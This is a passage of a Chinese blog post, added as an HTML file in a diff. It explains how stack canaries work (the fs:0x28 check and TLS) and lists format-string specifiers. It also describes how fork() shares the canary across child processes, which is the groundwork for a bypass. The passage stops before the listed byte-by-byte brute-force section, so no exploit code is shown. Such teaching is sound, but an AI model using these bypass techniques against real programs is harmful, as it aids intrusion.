@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Canary保护原理及绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Canary保护原理及绕过">
+<meta property="og:url" content="http://example.com/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Hanson&#39;s blog">
+<meta property="og:description" content="Canary保护原理及绕过">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/image-20260305172407780.png">
+<meta property="og:image" content="http://example.com/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/image-20260305173041680.png">
+<meta property="article:published_time" content="2026-03-09T13:51:30.000Z">
+<meta property="article:modified_time" content="2026-10-30T11:29:22.027Z">
+<meta property="article:author" content="Hanson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/image-20260305172407780.png">
+
+
+<link rel="canonical" href="http://example.com/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/","path":"2026/03/09/Canary保护原理及绕过/","title":"Canary保护原理及绕过"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Canary保护原理及绕过 | Hanson's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","cdn":"https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hanson's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">Canary保护原理及绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">Canary工作原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text">Canary的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.2.1.</span> <span class="nav-text">格式化字符串</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E7%9F%A5%E8%AF%86%E7%82%B9%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.3.</span> <span class="nav-text">进程知识点介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%88%B6%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%AD%90%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.3.1.</span> <span class="nav-text">什么是父进程和子进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fork-%E7%9A%84%E5%85%B3%E9%94%AE%E7%89%B9%E7%82%B9"><span class="nav-number">1.3.2.</span> <span class="nav-text">fork 的关键特点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.4.</span> <span class="nav-text">攻击代码实现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4%E8%8E%B7%E5%8F%96canary"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">1.逐字节爆破获取canary</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-24-ezcanary"><span class="nav-number">1.4.0.1.1.</span> <span class="nav-text">例题 24  ezcanary</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Hanson"
+      src="/images/dog.png">
+  <p class="site-author-name" itemprop="name">Hanson</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Hanson0512" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hanson0512" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2394056860@qq.com" title="E-Mail → mailto:2394056860@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/dog.png">
+      <meta itemprop="name" content="Hanson">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hanson's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Canary保护原理及绕过 | Hanson's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Canary保护原理及绕过
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-03-09 21:51:30" itemprop="dateCreated datePublished" datetime="2026-03-09T21:51:30+08:00">2026-03-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-30 19:29:22" itemprop="dateModified" datetime="2026-10-30T19:29:22+08:00">2026-10-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="Canary保护原理及绕过"><a href="#Canary保护原理及绕过" class="headerlink" title="Canary保护原理及绕过"></a>Canary保护原理及绕过</h1><span id="more"></span>
+<p>Canary的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有]毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。<br>    我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖rbp、rip等，从而达到劫持控制流的目的。</p>
+<p>​    栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会<strong>先往栈底插入cookie信息</strong>，当函数真正返回的时候会<strong>验证cookie信息是否合法</strong>(栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行(栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行，避免漏洞利用成功。</p>
+<p><strong>在Linux中我们将cookie 信息称为Canary。</strong><br><img src="/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/image-20260305172407780.png" class="" title="image-20260305172407780"></p>
+<h2 id="Canary工作原理"><a href="#Canary工作原理" class="headerlink" title="Canary工作原理"></a>Canary工作原理</h2><!--more-->
+<img src="/2026/03/09/Canary%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/image-20260305173041680.png" class="" title="image-20260305173041680">
+<p>当我们按照常规栈溢出的思路去覆盖的时候，canary部分的信息就被破坏了，函数return的时候就无法通过canary检查，因此退出</p>
+<p>对比参考汇编：</p>
+<p>mov rdx,QWORD PTR [rbp-0x8]</p>
+<p>xor rdx,QWORD PTR fs:0x28</p>
+<p> je 0x4005d7<main+65> </p>
+<p>call 0x400460 <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#60;&#x73;&#116;&#97;&#99;&#107;&#x5f;&#99;&#104;&#107;&#95;&#x66;&#97;&#x69;&#108;&#64;&#x70;&#x6c;&#116;">&#60;&#x73;&#116;&#97;&#99;&#107;&#x5f;&#99;&#104;&#107;&#95;&#x66;&#97;&#x69;&#108;&#64;&#x70;&#x6c;&#116;</a>&gt;</p>
+<p>意思就是从rbp-8这个栈所存放的地址去内存里找对应的地址的内容，然后取qword（四个字节）放到rdx寄存器里面</p>
+<p><code>fs:0x28</code> 是是 <strong>段寄存器寻址（segment addressing）</strong>。</p>
+<p>x86有一些 <strong>段寄存器</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cs</span><br><span class="line">ds</span><br><span class="line">es</span><br><span class="line">fs</span><br><span class="line">gs</span><br><span class="line">ss</span><br></pre></td></tr></table></figure>
+<p>在现代 Linux x64 中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fs → Thread Local Storage</span><br></pre></td></tr></table></figure>
+<p>也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">线程本地存储区</span><br></pre></td></tr></table></figure>
+<p>每个线程有一块私有内存：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread Local Storage</span><br></pre></td></tr></table></figure>
+<p>结构大概：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FS BASE</span><br><span class="line"> │</span><br><span class="line"> │</span><br><span class="line"> │ 0x00</span><br><span class="line"> │</span><br><span class="line"> │</span><br><span class="line"> │ 0x28 → stack_canary</span><br><span class="line"> │</span><br><span class="line"> │</span><br><span class="line"> │</span><br></pre></td></tr></table></figure>
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fs:0x28</span><br></pre></td></tr></table></figure>
+<p>意思就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">地址 = fs_base + 0x28</span><br></pre></td></tr></table></figure>
+<p>为什么 canary 放这里？</p>
+<p>因为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每个线程需要自己的 canary</span><br></pre></td></tr></table></figure>
+<p>否则：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多线程程序会冲突</span><br></pre></td></tr></table></figure>
+<p>所以 Linux 设计成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLS + offset</span><br></pre></td></tr></table></figure>
+<h2 id="Canary的绕过"><a href="#Canary的绕过" class="headerlink" title="Canary的绕过"></a>Canary的绕过</h2><!--more-->
+<p>几种常见的绕过方法：</p>
+<p>1.格式化字符串泄露</p>
+<p>2.canary的危险构造</p>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><!--more-->
+<p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。</p>
+<p>一般来说，格式化字符串在利用的时候主要分为三个部分</p>
+<p>1.格式化字符串函数</p>
+<p>2.格式化字符串<br>3.后续参数，可选</p>
+<p>所谓 <strong>格式化字符串函数</strong>，其实就是一类函数：</p>
+<blockquote>
+<p><strong>把变量按照指定格式打印出来</strong></p>
+</blockquote>
+<p>最常见的就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf()</span><br><span class="line">sprintf()</span><br><span class="line">fprintf()</span><br><span class="line">snprintf()</span><br><span class="line">scanf()</span><br><span class="line">sscanf()</span><br></pre></td></tr></table></figure>
+<p>最经典的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(格式字符串, 参数1, 参数2, 参数3...)</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a = 10;</span><br><span class="line">printf(&quot;a = %d\n&quot;, a);</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = 10</span><br></pre></td></tr></table></figure>
+<p>这里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%d</span><br></pre></td></tr></table></figure>
+<p>就是 <strong>格式说明符</strong>。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">格式说明符</th>
+<th style="text-align:left">类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">%c</td>
+<td style="text-align:left">字符</td>
+</tr>
+<tr>
+<td style="text-align:left">%d</td>
+<td style="text-align:left">有符号整数</td>
+</tr>
+<tr>
+<td style="text-align:left">%e 或 %E</td>
+<td style="text-align:left">浮点数的科学计数法</td>
+</tr>
+<tr>
+<td style="text-align:left">%f</td>
+<td style="text-align:left">浮点值</td>
+</tr>
+<tr>
+<td style="text-align:left">%g 或 %G</td>
+<td style="text-align:left">类似于 %e 或%E</td>
+</tr>
+<tr>
+<td style="text-align:left">%hi</td>
+<td style="text-align:left">有符号整数(短整型)</td>
+</tr>
+<tr>
+<td style="text-align:left">%hu</td>
+<td style="text-align:left">无符号整数(短整型)</td>
+</tr>
+<tr>
+<td style="text-align:left">%i</td>
+<td style="text-align:left">无符号整数</td>
+</tr>
+<tr>
+<td style="text-align:left">%l 或 %ld 或 %li</td>
+<td style="text-align:left">长整型</td>
+</tr>
+<tr>
+<td style="text-align:left">%lf</td>
+<td style="text-align:left">双精度型</td>
+</tr>
+<tr>
+<td style="text-align:left">%Lf</td>
+<td style="text-align:left">长双精度型</td>
+</tr>
+<tr>
+<td style="text-align:left">%lu</td>
+<td style="text-align:left">无符号整数或无符号long</td>
+</tr>
+<tr>
+<td style="text-align:left">%lli 或 %lld</td>
+<td style="text-align:left">Long long</td>
+</tr>
+<tr>
+<td style="text-align:left">%llu</td>
+<td style="text-align:left">无符号 long long</td>
+</tr>
+<tr>
+<td style="text-align:left">%o</td>
+<td style="text-align:left">八进制表示</td>
+</tr>
+<tr>
+<td style="text-align:left">%p</td>
+<td style="text-align:left">指针</td>
+</tr>
+<tr>
+<td style="text-align:left">%s</td>
+<td style="text-align:left">字符串</td>
+</tr>
+<tr>
+<td style="text-align:left">%u</td>
+<td style="text-align:left">无符号 int</td>
+</tr>
+<tr>
+<td style="text-align:left">%x 或 %X</td>
+<td style="text-align:left">十六进制表示</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="进程知识点介绍"><a href="#进程知识点介绍" class="headerlink" title="进程知识点介绍"></a>进程知识点介绍</h2><!--more-->
+<blockquote>
+<p><strong>进程 = 正在运行的一个程序实例</strong></p>
+</blockquote>
+<p>例如你运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwn</span><br></pre></td></tr></table></figure>
+<p>操作系统就会创建一个 <strong>进程</strong> 来执行这个程序。</p>
+<p>一个进程里面包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">代码段 (text)</span><br><span class="line">数据段 (data)</span><br><span class="line">堆 (heap)</span><br><span class="line">栈 (stack)</span><br><span class="line">寄存器状态</span><br><span class="line">打开的文件</span><br></pre></td></tr></table></figure>
+<p>结构可以想象成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进程</span><br><span class="line"> ├── 代码</span><br><span class="line"> ├── 全局变量</span><br><span class="line"> ├── heap</span><br><span class="line"> └── stack</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwn</span><br></pre></td></tr></table></figure>
+<p>运行后内存里会出现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进程 pwn</span><br><span class="line">   |</span><br><span class="line">   |-- code</span><br><span class="line">   |-- heap</span><br><span class="line">   |-- stack</span><br></pre></td></tr></table></figure>
+<p>而 <strong>canary 就存在 stack 里面</strong>。</p>
+<hr>
+<h3 id="什么是父进程和子进程"><a href="#什么是父进程和子进程" class="headerlink" title="什么是父进程和子进程"></a>什么是父进程和子进程</h3><!--more-->
+<p>在 Linux 中，一个进程可以 <strong>创建新的进程</strong>。</p>
+<p>这个函数就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fork()</span><br></pre></td></tr></table></figure>
+<p><code>fork()</code> 函数具有以下两个特点：</p>
+<ol>
+<li>由于子进程和父进程的栈结构是完全相同的，因此保存在子进程栈上的随机数与保存在父进程栈上的随机数完全相同。换句话说，所有子进程和父进程共享同一个 Canary</li>
+<li>子进程的崩溃不会导致父进程崩溃</li>
+</ol>
+<p>这两个特点意味着当程序调用 <code>fork()</code> 函数创建了足够多的子进程时，我们可以不断访问子进程。</p>
+<p>调用之后会发生：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原来的进程</span><br><span class="line">   |</span><br><span class="line">fork()</span><br><span class="line">   |</span><br><span class="line">   ├── 父进程 (parent)</span><br><span class="line">   └── 子进程 (child)</span><br></pre></td></tr></table></figure>
+<p>举个简单例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    fork();</span><br><span class="line">    printf(&quot;Hello\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure>
+<p>为什么打印两次？</p>
+<p>因为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">程序开始运行</span><br><span class="line">     |</span><br><span class="line">     fork()</span><br><span class="line">     |</span><br><span class="line"> ┌─────────────┐</span><br><span class="line"> │             │</span><br><span class="line">父进程       子进程</span><br><span class="line"> │             │</span><br><span class="line">printf        printf</span><br></pre></td></tr></table></figure>
+<p>所以输出两次。</p>
+<hr>
+<h3 id="fork-的关键特点"><a href="#fork-的关键特点" class="headerlink" title="fork 的关键特点"></a>fork 的关键特点</h3><!--more-->
+<p>fork 会：</p>
+<blockquote>
+<p><strong>复制整个进程的内存</strong></p>
+</blockquote>
+<p>包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stack</span><br><span class="line">heap</span><br><span class="line">data</span><br><span class="line">寄存器</span><br></pre></td></tr></table></figure>
